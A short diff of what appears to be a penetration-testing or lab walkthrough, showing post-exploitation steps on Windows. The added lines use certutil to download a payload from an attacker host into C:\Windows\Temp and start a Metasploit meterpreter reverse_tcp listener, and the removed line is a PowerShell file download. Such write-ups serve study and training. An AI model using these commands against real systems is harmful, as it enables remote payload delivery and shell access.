@@ -98,6 +98,11 @@ python3 -m http.server 9090
 ```
 ## Download the Pay Via the Netcat Shell
 Using netcat, let us download the payload via the following command
+```shell
+certutil -urlcache -split -f http://10.9.0.124:9090/clown.exe C:\Windows\Temp\shell.exe
 ```
-(New-Object Net.WebClient).DownloadFile('https://example.com/file.exe', 'c:\windows\system32\inetsrv\clown.exe')
+## Setup a Listener
+```bash
+msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.9.0.124; set lport 7777; exploit"
 ```
+
